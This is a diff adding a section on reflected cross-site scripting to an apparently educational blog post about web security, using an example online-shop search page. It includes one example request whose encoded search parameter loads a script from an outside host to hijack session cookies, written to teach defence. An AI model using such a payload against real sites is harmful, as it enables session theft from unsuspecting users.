@@ -36,6 +36,25 @@ A typical example of XSS is *persistent cross-site scripting*. If a page isn't p
 
 ![image-title-here](/images/attack.gif){:class="img-responsive"}
 
+An alternative is the *reflected* (or non-persistent) XSS atack, whereby the user's input is not stored in the database, but returned back in the same way it was inputed. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.
+
+<pre>
+GET http://www.onlineshop.com?search=something
+</pre>
+
+If the site finds something, it returns a list of results, but if it doesn't, it's going to say
+
+*Your search, 'something', returned no results.*
+
+... which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term, contains some nefarious script block. If the user clicks on the link (which is likely because most people don't hover on links to see where they lead to), the application server won't be able to find any result, and will return with a *not found* page containing the script rendered directly on the page. 
+
+<pre>
+GET http://www.onlineshop.com?
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
+</pre>
+
+This script can then hijack the session cookie, like in the previous example.
+
 What can we do about it? Actually two things:
 
 1. Valdiate inputs: this means checking that the user didn't try to input any funky stuff and warning him if this is the case.
